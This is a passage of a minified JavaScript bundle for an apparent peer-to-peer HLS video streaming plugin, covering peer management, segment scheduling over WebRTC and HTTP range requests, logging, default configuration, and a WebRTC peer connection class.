        t.default = g, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { for (var r in t) Object.defineProperty(e, r, { value: t[r], enumerable: !0, configurable: !0 }); return e }

        function n(e, t, r) { if (!e || "string" == typeof e) throw new TypeError("Please pass an Error to err-code");
            r || (r = {}), "object" === (void 0 === t ? "undefined" : a(t)) && (r = t, t = void 0), null != t && (r.code = t); try { return i(e, r) } catch (t) { r.message = e.message, r.stack = e.stack; var n = function() {}; return n.prototype = Object.create(Object.getPrototypeOf(e)), i(new n, r) } } var a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) { return typeof e } : function(e) { return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e };
        e.exports = n }, function(e, t, r) { "use strict";

        function i(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }
        Object.defineProperty(t, "__esModule", { value: !0 }); var a = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            s = function() {
                function e() { n(this, e), this.peerMap = new Map } return a(e, [{ key: "isEmpty", value: function() { return 0 === this.peerMap.size } }, { key: "size", value: function() { return this.peerMap.size } }, { key: "clear", value: function() { this.peerMap.clear() } }, { key: "getPeers", value: function() { return [].concat(i(this.peerMap.values())) } }, { key: "getPeerValues", value: function() { return this.peerMap.values() } }, { key: "hasPeer", value: function(e) { return this.peerMap.has(e) } }, { key: "addPeer", value: function(e, t) { this.peerMap.set(e, t) } }, { key: "getPeerIds", value: function() { return [].concat(i(this.peerMap.keys())) } }, { key: "removePeer", value: function(e) { this.peerMap.delete(e) } }, { key: "getPeersOrderByWeight", value: function() { var e = this.getPeers().filter(function(e) { return e.isAvailableUrgently }); return e.sort(function(e, t) { return 0 === t.weight ? 1 : 0 === e.weight ? -1 : t.weight - e.weight }), e } }, { key: "getPeer", value: function(e) { return this.peerMap.get(e) } }, { key: "getAvailablePeers", value: function() { return this.getPeers().filter(function(e) { return e.isAvailable }) } }]), e }();
        t.default = s, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }
        Object.defineProperty(t, "__esModule", { value: !0 }); var n = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            a = r(0),
            s = { debug: 0, info: 1, warn: 2, error: 3, none: 4 },
            o = function() {
                function e(t) { i(this, e), this.config = t, console.debug = console.log, "debug" !== t.logLevel && "info" !== t.logLevel || (t.logLevel = "warn"), !0 === t.logLevel ? t.logLevel = "warn" : !1 === t.logLevel ? t.logLevel = "none" : t.logLevel in s || (t.logLevel = "error"); for (var r in s) s[r] < s[t.logLevel] ? this[r] = a.noop : this[r] = console[r] } return n(e, [{ key: "enableDebug", value: function() { for (var e in s) this[e] = console[e] } }, { key: "isDebugLevel", get: function() { return s[this.config.logLevel] <= 1 } }]), e }();
        t.default = o, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = function e(t, r, i) { null === t && (t = Function.prototype); var n = Object.getOwnPropertyDescriptor(t, r); if (void 0 === n) { var a = Object.getPrototypeOf(t); return null === a ? void 0 : e(a, r, i) } if ("value" in n) return n.value; var s = n.get; if (void 0 !== s) return s.call(i) },
            u = r(2),
            c = r(9),
            d = i(c),
            f = r(15),
            h = i(f),
            g = r(0),
            p = 2,
            v = function(e) {
                function t(e, r) { n(this, t); var i = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, r)); return i.targetPeers = [], i.mBufferedDuration = 0, i.loadingSegId = "", i.allowP2pLimit = r.httpLoadTime + p, i.playlistInfo = new Map, i.subscribeMode = !1, i.subscribeLevel = 0, i.subscribers = [], i.subscribeParent = null, i.subscriberEdgeSN = 0, i.isUploader = !1, i.isReceiver = !1, i } return s(t, e), o(t, [{ key: "hasAndSetTargetPeer", value: function(e) { var t = this.logger,
                            r = this.config; if (this.criticalSeg && t.warn("scheduler still loading " + JSON.stringify(this.criticalSeg)), this.waitForPeer) { if (this.peersHas(e)) { var i = !0,
                                    n = !1,
                                    a = void 0; try { for (var s, o = this.peerManager.getAvailablePeers()[Symbol.iterator](); !(i = (s = o.next()).done); i = !0) { var l = s.value; if (l.bitset.has(e)) return t.info("found " + e + " from peer " + l.remotePeerId), this.targetPeers.push(l), !0 } } catch (e) { n = !0, a = e } finally { try {!i && o.return && o.return() } finally { if (n) throw a } } } return 0 !== this.waitingPeers && this.waitingPeers === this.peersNum ? (t.info("all connected no need wait"), !1) : (t.warn("wait for peer to load " + e), this.requestingMap.setPeerUnknown(e), !0) } var u = this.bufferedDuration; if (this.subscribeMode) { var c = this.subscribeParent,
                                d = c.remotePeerId; return c.bitset.has(e) ? c.downloading ? this._searchAvailablePeers(e) : (t.info("found " + e + " from parent " + d), this.targetPeers.push(this.subscribeParent), !0) : !(u <= 3.5) && (t.info("under subscribe to " + d), this.requestingMap.set(e, d), !0) } if (u <= this.allowP2pLimit) return !1; if (this.requestingMap.has(e)) { var f = this.requestingMap.getOnePeerId(e),
                                h = this.peerManager.getPeer(f); return h ? !(performance.now() - h.timeSendRequest > 3e3 && !h.shouldWaitForRemain(1e3 * (u - r.httpLoadTime)) && this._searchAvailablePeers(e, 1)) || (t.warn(f + " prefetch timeout at " + e), this.targetPeers.push(h), this.requestingMap.delete(e), !0) : this._searchAvailablePeers(e) } return this._searchAvailablePeers(e) } }, { key: "_searchAvailablePeers", value: function(e) { var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 5; if (!this.hasIdlePeers || !this.peersHas(e)) return !1; var r = 0,
                            i = !0,
                            n = !1,
                            a = void 0; try { for (var s, o = this.peerManager.getPeersOrderByWeight()[Symbol.iterator](); !(i = (s = o.next()).done); i = !0) { var l = s.value; if (l.bitset.has(e) && (this.logger.info("found " + e + " from peer " + l.remotePeerId), this.targetPeers.push(l), ++r === t || r === this.config.simultaneousTargetPeers)) return !0 } } catch (e) { n = !0, a = e } finally { try {!i && o.return && o.return() } finally { if (n) throw a } } return this.targetPeers.length > 0 } }, { key: "notifyAllPeers", value: function(e, t) { var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : [],
                            i = this.config.live,
                            n = t; if (this.sequential && (n = e), !this.bitset.has(n)) { var a = !0,
                                s = !1,
                                o = void 0; try { for (var l, u = this.peerManager.getPeerValues()[Symbol.iterator](); !(a = (l = u.next()).done); a = !0) { var c = l.value; if (!c.bitset.has(n)) { if (i && (this.subscribers.includes(c.remotePeerId) || this.subscribeParent && c.remotePeerId === this.subscribeParent.remotePeerId)) continue;
                                        r.includes(c.remotePeerId) || (c.sendMsgHave(e, t), c.bitset.add(n)) } } } catch (e) { s = !0, o = e } finally { try {!a && u.return && u.return() } finally { if (s) throw o } } } } }, { key: "updateLoaded", value: function(e) { this.bitset.has(e) || (this.bitset.add(e), this.bitCounts.has(e) && this.bitCounts.delete(e)) } }, { key: "deletePeer", value: function(e) { var r = this;
                        this.peerManager.hasPeer(e.remotePeerId) && e.bitset.forEach(function(e) { r._decreBitCounts(e) }), this.cleanRequestingMap(e.remotePeerId), l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "deletePeer", this).call(this, e) } }, { key: "_setupDC", value: function(e) { var r = this;
                        l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e);
                        this.logger;
                        e.on(d.default.DC_METADATA, function(t) { t.field && (e.bitset = new Set(t.field), t.field.forEach(function(e) { r.bitset.has(e) || r._increBitCounts(e) }), r.addPeer(e), r.downloadOnly && r.chokePeerRequest(e)) }).on(d.default.DC_PIECE, function(e) { r.criticalSeg && r.criticalSeg.segId === e.seg_id && (r.stats.tfirst = Math.max(performance.now(), r.stats.trequest)) }) } }, { key: "loadRemainBufferByHttp", value: function(e) { var t = this,
                            r = u.Buffer.concat(e.bufArr),
                            i = "bytes="; if (this.context.rangeEnd) { var n = Number(this.context.rangeStart),
                                a = Number(this.context.rangeEnd);
                            i = "" + i + (n + r.byteLength) + "-" + (a - 1) } else i = "" + i + r.byteLength + "-";
                        this.logger.info("continue download from " + this.context.frag.url + " range: " + i), fetch(this.context.frag.url, { headers: { Range: i } }).then(function(e) { return e.arrayBuffer() }).then(function(i) { var n = u.Buffer.from(i);
                            t.engine.fetcher.reportFlow(n.byteLength); var a = u.Buffer.concat([r, n]),
                                s = new Uint8Array(a).buffer,
                                o = t.stats;
                            o.tfirst = o.loading.first = Math.max(o.trequest, performance.now()), o.tload = o.loading.end = o.tfirst, o.loaded = o.total = a.byteLength; var l = t.context.frag;
                            l.fromPeerId = e.remotePeerId, l.loadByP2P = !0, t.callbacks.onSuccess({ data: s }, o, t.context) }).catch(function(e) { t.logger.error("http partial download error " + e), t.callbacks.onTimeout(t.stats, t.context, null) }) } }, { key: "broadcastPlaylist", value: function(e, t) { if (this.config.live) { var r = !0,
                                i = !1,
                                n = void 0; try { for (var a, s = this.peerManager.getPeerValues()[Symbol.iterator](); !(r = (a = s.next()).done); r = !0) { a.value.sendMsgPlaylist(e, t) } } catch (e) { i = !0, n = e } finally { try {!r && s.return && s.return() } finally { if (i) throw n } } var o = (0, g.getCurrentTs)(),
                                l = (0, h.default)(t);
                            this.playlistInfo.set(e, { hash: l, ts: o }) } } }, { key: "getPlaylistFromPeer", value: function(e) { if (!this.config.live) return null; var t = this.playlistInfo.get(e),
                            r = t.ts,
                            i = t.hash,
                            n = !0,
                            a = !1,
                            s = void 0; try { for (var o, l = this.peerManager.getPeerValues()[Symbol.iterator](); !(n = (o = l.next()).done); n = !0) { var u = o.value,
                                    c = u.getLatestPlaylist(e, r); if (c) { var d = (0, h.default)(c.data); if (i !== d) return this.playlistInfo.set(e, { hash: d, ts: c.ts }), c } } } catch (e) { a = !0, s = e } finally { try {!n && l.return && l.return() } finally { if (a) throw s } } return null } }, { key: "_handlePieceAborted", value: function(e) { this.criticalSeg && this.criticalSeg.targetPeers.includes(e) ? 1 === this.criticalSeg.targetPeers.length ? (clearTimeout(this.criticaltimeouter), this.criticaltimeout(), this.cleanRequestingMap(e)) : this.criticalSeg.targetPeers = this.criticalSeg.targetPeers.filter(function(t) { return t !== e }) : this.cleanRequestingMap(e) } }, { key: "criticaltimeout", value: function() { var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                            t = this.logger,
                            r = this.config; if (this.waitForPeer && (this.waitForPeer = !1), this.criticalSeg) { var i = this.criticalSeg.sn,
                                n = this.criticalSeg.segId;
                            this.sequential && (n = i), t.info("critical request sn " + n + " timeout"); var a = void 0;
                            this.subscribeMode ? a = this.subscribeParent : this.requestingMap.has(n) && (a = this.getPeerLoadedMore(n)); var s = 1e3 * r.httpLoadTime; if (e && a && a.shouldWaitForRemain(s - 200)) return t.info("wait for peer load remain of " + i), void(this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this), s));
                            r.httpRangeSupported && a && a.bufArr.length > 0 ? this.loadRemainBufferByHttp(a) : this.callbacks.onTimeout(this.stats, this.context, null), a && a.loadtimeout(), this.requestingMap.delete(n), r.live && a && a.resetContinuousHits(), this.subscribeParent && this._unsubscribe("subscribe timeout for " + i), this.criticalSeg = null, this.criticaltimeouter = null } } }, { key: "shouldWaitForNextSeg", value: function() { var e = !1; return e = !(this.subscribers.length > 0 || this.isUploader) && (!!this.isReceiver || (0, g.randomNum)(0, 100) > 20), this.isReceiver = this.isUploader = !1, e } }, { key: "bufferedDuration", get: function() { for (var e = this.engine.media, t = 0, r = e.currentTime, i = e.buffered, n = i.length - 1; n >= 0; n--)
                            if (r >= i.start(n) && r <= i.end(n)) { t = i.end(n) - r; break }
                        return this.logger.info("bufferedDuration " + t), this.mBufferedDuration = t, t > 0 ? t : 0 } }]), t }(u.BtScheduler);
        t.default = v, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function n(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function a(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var s, o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = r(22),
            u = function(e) { return e && e.__esModule ? e : { default: e } }(l);
        s = r(39); var c = { maxBufferLength: 8 },
            d = { maxBufferLength: 40 },
            f = function(e) {
                function t() { var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    i(this, t); var r = e.p2pConfig || {},
                        a = !0 === r.live ? c : d,
                        o = JSON.parse(JSON.stringify(a));
                    o.liveSyncDurationCount = 10, o.maxBufferSize = 0; for (var l in e) "p2pConfig" !== l && (o[l] = e[l]); var f = n(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, o)); return f._restartEvent = function() { console.warn("hlsjs restartP2P"), f.restartP2P() }, u.default.isSupported() && (f._p2pEngine = new u.default(f, r), f._p2pEngine.on(u.default.Events.RESTART_P2P, f._restartEvent)), f.on(s.Events.DESTROYING, function() { console.warn("destroying hlsjs"), f._p2pEngine && (f._p2pEngine.destroy(), f._p2pEngine = null) }), f } return a(t, e), o(t, null, [{ key: "P2PEvents", get: function() { return u.default.Events } }]), o(t, [{ key: "enableP2P", value: function() { this._p2pEngine = this._p2pEngine.enableP2P() } }, { key: "disableP2P", value: function() { this._p2pEngine.disableP2P() } }, { key: "restartP2P", value: function() { var e = this;
                        this._p2pEngine.disableP2P(), setTimeout(function() { e.enableP2P() }, 2e3), this._p2pEngine.removeListener(u.default.Events.RESTART_P2P, this._restartEvent) } }, { key: "p2pEngine", get: function() { return this._p2pEngine } }]), t }(s);
        f.engineVersion = u.default.version, f.protocolVersion = u.default.protocolVersion, f.WEBRTC_SUPPORT = u.default.isSupported(), t.default = f, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = Object.assign || function(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]) } return e },
            l = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            u = r(6),
            c = i(u),
            d = r(23),
            f = i(d),
            h = r(35),
            g = i(h),
            p = r(36),
            v = i(p),
            m = r(2),
            y = r(4),
            b = r(0),
            _ = r(5),
            E = r(37),
            S = i(E),
            T = r(12),
            w = i(T); if (window.p2ploadedHls) throw new Error("P2P plugin is loaded before");
        window.p2ploadedHls = !0; var A = function(e) {
            function t(e) { var r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                n(this, t); var i = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, r));
                i.config = Object.assign({}, f.default, r), i.rangeTested = !1, e.config.segmentId = i.config.segmentId, i.hlsjs = e, i.p2pEnabled = !(!1 === i.config.p2pEnabled || "0" === (0, b.getQueryParam)("_p2p")), i.HLSEvents = e.constructor.Events, i.config.isHlsV0 = "0" === e.constructor.version.split(".")[0]; var s = function r(n, a) { var s = a.details,
                        l = s.live;
                    i.config.live = i.hlsjs.config.live = l, i.config.startSN = s.startSN, i.config.endSN = s.endSN; var u = y.platform.getPlatform();
                    i.netType = y.platform.getNetType() || void 0, i.netType || (i.netType = "wifi"), i.browserInfo = { device: u, netType: i.netType, tag: i.config.tag || e.constructor.version + "-" + y.platform.getBrowser(), live: l, type: "hls" }, u === y.platform.device.PC_NATIVE && (i.browserInfo = o({}, i.browserInfo, { app: i.config.appName, bundle: i.config.appId })), !1 !== i.config.useHttpRange && l && (i.config.useHttpRange = !0); var d = i.config,
                        f = d.channelIdPrefix,
                        h = d.channelId,
                        g = function(e, t) { var r = c.default.parseURL(e); return "" + (r.netLoc.substr(2) + r.path.substring(0, r.path.lastIndexOf("."))) };
                    h && "function" == typeof h && (g = i.makeChannelId(f, h)); var p = i.makeSignalId();
                    i.channel = g(e.url, i.browserInfo) + "|" + p + "[" + m.Peer.VERSION + "]"; var v = i.initLogger();
                    i.hlsjs.config.logger = v, v.info("P2P version: " + t.version + " Hlsjs version: " + e.constructor.version), v.info("channel " + i.channel), i.eventListened = !1, i._init(i.channel, i.browserInfo), v.info("startSN " + s.startSN + " endSN " + s.endSN), e.off(i.HLSEvents.LEVEL_LOADED, r) };
                e.on(i.HLSEvents.LEVEL_LOADED, s); var l = function t(r, n) { var a = n.levels.length;
                    i.multiBitrate = a > 1, e.off(i.HLSEvents.MANIFEST_PARSED, t) }; return e.on(i.HLSEvents.MANIFEST_PARSED, l), i } return s(t, e), l(t, null, [{ key: "Events", get: function() { return m.Events } }]), l(t, [{ key: "_init", value: function(e, t) { if (this.p2pEnabled) { var r = this.multiBitrate || this.config.scheduledBySegId;
                        this.hlsjs.config.p2pEnabled = this.p2pEnabled, this.hlsjs.config.sharePlaylist = this.config.sharePlaylist, this.bufMgr = new m.SegmentManager(this, this.config, !r), this.hlsjs.config.bufMgr = this.bufMgr, this.media = this.hlsjs.media; var i = new m.Server(this, this.config.token, encodeURIComponent(e), this.config.announce || "", t);
                        this.fetcher = i; var n = void 0;
                        n = r ? new w.default(this, this.config) : new S.default(this, this.config), this.tracker = new m.Tracker(this, i, n, this.config), n.bufferManager = this.bufMgr, this.hlsjs.config.fLoader = g.default, this.config.sharePlaylist && (this.hlsjs.config.pLoader = v.default), window.__p2p_loader__ = { scheduler: this.tracker.scheduler, fetcher: i, p2pBlackList: this.config.p2pBlackList }, this.trackerTried = !1, this.eventListened || (this.hlsjs.on(this.HLSEvents.FRAG_LOADING, this._onFragLoading.bind(this)), this.hlsjs.on(this.HLSEvents.FRAG_LOADED, this._onFragLoaded.bind(this)), this.hlsjs.on(this.HLSEvents.FRAG_CHANGED, this._onFragChanged.bind(this)), this.hlsjs.on(this.HLSEvents.ERROR, this._onHlsError.bind(this)), this.eventListened = !0), this.setupWindowListeners(), this.trackerTried || this.tracker.connected || !this.config.p2pEnabled || (this.tracker.resumeP2P(), this.trackerTried = !0) } } }, { key: "_onFragLoading", value: function(e, t) { var r = t.frag,
                        i = r.sn,
                        n = r.segId; if (!(0, _.isBlockType)(r.url, this.config.p2pBlackList)) { if (this.logger.debug("loading frag " + i), !n) { var a = void 0;
                            r._byteRange && (a = "bytes=" + r._byteRange[0] + "-" + r._byteRange[1]); var s = r.url;
                            n = t.frag.segId = this.config.segmentId(r.baseurl, r.sn, s, a) }
                        this.emit(m.Events.FRAG_LOADING, i, n, t.frag.loadByHTTP) } } }, { key: "_onFragLoaded", value: function(e, t) { var r = t.frag,
                        i = r.sn,
                        n = r.segId,
                        a = r.loaded,
                        s = r.duration,
                        o = this.config,
                        l = this.logger;
                    (0, _.isBlockType)(t.frag.url, o.p2pBlackList) || (this.emit(m.Events.FRAG_LOADED, i, n, a, s), !this.rangeTested && o.useHttpRange && ((0, b.performRangeRequest)(t.frag.url).then(function() { o.httpRangeSupported = !0, l.info("http range is supported"), o.httpLoadTime -= 1.5 }).catch(function() { o.httpRangeSupported = !1, l.warn("http range is not supported") }), this.rangeTested = !0)) } }, { key: "_onFragChanged", value: function(e, t) { if (!(0, _.isBlockType)(t.frag.url, this.config.p2pBlackList)) { this.logger.debug("frag changed: " + t.frag.sn); var r = t.frag,
                            i = r.sn,
                            n = r.duration;
                        this.emit(m.Events.FRAG_CHANGED, i, n) } } }, { key: "_onHlsError", value: function(e, t) { var r = this.logger;
                    t.fatal ? r.error(t.type + " details " + t.details + " reason " + t.reason) : r.warn(t.type + " details " + t.details + " reason " + t.reason); var i = this.hlsjs.constructor.ErrorDetails; switch (t.details) {
                        case i.BUFFER_STALLED_ERROR:
                            this.fetcher && this.fetcher.errsBufStalled++; break;
                        case i.INTERNAL_EXCEPTION:
                            this.fetcher && (this.fetcher.errsInternalExpt++, this.fetcher.exptMsg = t.err.message), r.error("INTERNAL_EXCEPTION event " + t.event + " err " + t.err.message), this.emit(m.Events.EXCEPTION, (0, y.errCode)(t.err, "HLSJS_EXPT")) } } }, { key: "disableP2P", value: function() { this.logger && this.logger.warn("disable P2P"), this.removeAllListeners(), this.p2pEnabled && (this.p2pEnabled = !1, this.config.p2pEnabled = this.hlsjs.config.p2pEnabled = this.p2pEnabled, this.tracker && (this.tracker.stopP2P(), this.tracker = {}, this.fetcher = null, this.bufMgr.destroy(), this.bufMgr = null, this.hlsjs.config.fLoader = this.hlsjs.config.pLoader = this.hlsjs.constructor.DefaultConfig.loader)) } }]), t }(m.EngineBase);
        t.default = A, e.exports = t.default }, function(e, t, r) { "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }); var i = Object.assign || function(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]) } return e },
            n = r(2),
            a = i({}, n.config, { p2pBlackList: ["aac", "mp3", "vtt", "webvtt", "key"], scheduledBySegId: !1, maxSubscribeLevel: 3, live: !0, waitForPeer: !1, waitForPeerTimeout: 4.5, httpLoadTime: 2.5, sharePlaylist: !1 });
        a.segmentId = function(e, t, r, i) { var n = r.split("?")[0]; return n.startsWith("http") && (n = n.split("://")[1]), i ? n + "|" + i : "" + n }, t.default = a, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function n(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function a(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }

        function s(e) { return e.replace(/a=ice-options:trickle\s\n/g, "") }

        function o(e) { console.warn(e) } var l = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) { return typeof e } : function(e) { return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e },
            u = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            c = r(0),
            d = r(1),
            f = function(e) { return e && e.__esModule ? e : { default: e } }(d),
            h = r(13),
            g = r(7).Buffer,
            p = 5e3,
            v = function(e) {
                function t(e) { i(this, t); var r = n(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    r.channelName = e.initiator ? e.channelName : null, r.initiator = e.initiator || !1, r.channelConfig = e.channelConfig || t.channelConfig, r.channelNegotiated = r.channelConfig.negotiated, r.config = Object.assign({}, t.config, e.config), r.offerOptions = e.offerOptions || {}, r.answerOptions = e.answerOptions || {}, r.sdpTransform = e.sdpTransform || function(e) { return e }, r.trickle = void 0 === e.trickle || e.trickle, r.allowHalfTrickle = void 0 !== e.allowHalfTrickle && e.allowHalfTrickle, r.iceCompleteTimeout = e.iceCompleteTimeout || p, r.destroyed = !1, r.destroying = !1, r._connected = !1, r.remoteAddress = void 0, r.remoteFamily = void 0, r.remotePort = void 0, r.localAddress = void 0, r.localFamily = void 0, r.localPort = void 0, r._wrtc = e.wrtc && "object" === l(e.wrtc) ? e.wrtc : (0, c.getBrowserRTC)(), r._pcReady = !1, r._channelReady = !1, r._iceComplete = !1, r._iceCompleteTimer = null, r._channel = null, r._pendingCandidates = [], r._isNegotiating = !1, r._firstNegotiation = !0, r._batchedNegotiation = !1, r._queuedNegotiation = !1, r._sendersAwaitingStable = [], r._senderMap = new Map, r._closingInterval = null, r._remoteTracks = [], r._remoteStreams = [], r._chunk = null, r._cb = null, r._interval = null; try { r._pc = new r._wrtc.RTCPeerConnection(r.config) } catch (e) { return h(function() { return r.destroy(e) }), n(r) } return r._isReactNativeWebrtc = "number" == typeof r._pc._peerConnectionId, r._pc.oniceconnectionstatechange = function() { r._onIceStateChange() }, r._pc.onicegatheringstatechange = function() { r._onIceStateChange() }, r._pc.onconnectionstatechange = function() { r._onConnectionStateChange() }, r._pc.onsignalingstatechange = function() { r._onSignalingStateChange() }, r._pc.onicecandidate = function(e) { r._onIceCandidate(e) }, r.initiator || r.channelNegotiated ? r._setupData({ channel: r._pc.createDataChannel(r.channelName, r.channelConfig) }) : r._pc.ondatachannel = function(e) { r._setupData(e) }, r._needsNegotiation(), r } return a(t, e), u(t, [{ key: "signal", value: function(e) { var t = this; if (this.destroyed) throw new Error("cannot signal after peer is destroyed"); if ("string" == typeof e) try { e = JSON.parse(e) } catch (t) { e = {} }
                        e.renegotiate && this.initiator && this._needsNegotiation(), e.transceiverRequest && this.initiator && this.addTransceiver(e.transceiverRequest.kind, e.transceiverRequest.init), e.candidate && (this._pc.remoteDescription && this._pc.remoteDescription.type ? this._addIceCandidate(e.candidate) : this._pendingCandidates.push(e.candidate)), e.sdp && this._pc.setRemoteDescription(new this._wrtc.RTCSessionDescription(e)).then(function() { t.destroyed || (t._pendingCandidates.forEach(function(e) { t._addIceCandidate(e) }), t._pendingCandidates = [], "offer" === t._pc.remoteDescription.type && t._createAnswer()) }).catch(function(e) { t.destroy(e) }), e.sdp || e.candidate || e.renegotiate || e.transceiverRequest || this.destroy(new Error("signal() called with invalid signal data")) } }, { key: "_addIceCandidate", value: function(e) { var t = this,
                            r = new this._wrtc.RTCIceCandidate(e);
                        this._pc.addIceCandidate(r).catch(function(e) {!r.address || r.address.endsWith(".local") ? o("Ignoring unsupported ICE candidate.") : t.destroy(e) }) } }, { key: "send", value: function(e) { this._channel.send(e) } }, { key: "addTransceiver", value: function(e, t) { if (this.initiator) try { this._pc.addTransceiver(e, t), this._needsNegotiation() } catch (e) { this.destroy(e) } else this.emit("signal", { type: "transceiverRequest", transceiverRequest: { kind: e, init: t } }) } }, { key: "_needsNegotiation", value: function() { var e = this;
                        this._batchedNegotiation || (this._batchedNegotiation = !0, h(function() { e._batchedNegotiation = !1, !e.initiator && e._firstNegotiation || e.negotiate(), e._firstNegotiation = !1 })) } }, { key: "negotiate", value: function() { var e = this;
                        this.initiator ? this._isNegotiating ? this._queuedNegotiation = !0 : setTimeout(function() { e._createOffer() }, 0) : this._isNegotiating ? this._queuedNegotiation = !0 : this.emit("signal", { type: "renegotiate", renegotiate: !0 }), this._isNegotiating = !0 } }, { key: "destroy", value: function(e) { this._destroy(e, function() {}) } }, { key: "_destroy", value: function(e, t) { var r = this;
                        this.destroyed || this.destroying || (this.destroying = !0, h(function() { if (r.destroyed = !0, r.destroying = !1, r._connected = !1, r._pcReady = !1, r._channelReady = !1, r._remoteTracks = null, r._remoteStreams = null, r._senderMap = null, clearInterval(r._closingInterval), r._closingInterval = null, clearInterval(r._interval), r._interval = null, r._chunk = null, r._cb = null, r._channel) { try { r._channel.close() } catch (e) {}
                                r._channel.onmessage = null, r._channel.onopen = null, r._channel.onclose = null, r._channel.onerror = null } if (r._pc) { try { r._pc.close() } catch (e) {}
